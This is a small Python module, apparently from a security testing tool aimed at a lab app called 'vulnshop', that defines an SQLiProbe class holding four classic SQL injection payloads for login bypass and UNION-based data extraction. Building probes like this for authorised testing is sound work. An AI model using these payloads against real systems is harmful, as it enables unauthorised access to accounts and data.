"""SQL injection probe module."""

from typing import List


class SQLiProbe:
    """Specialized SQL Injection payload vectors and verification."""

    DEFAULT_PAYLOADS: List[str] = [
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT 1, 'admin', 'admin@vulnshop.local'--",
        "' OR '1'='1",
    ]

    @staticmethod
    def get_candidate_payloads() -> List[str]:
        return list(SQLiProbe.DEFAULT_PAYLOADS)
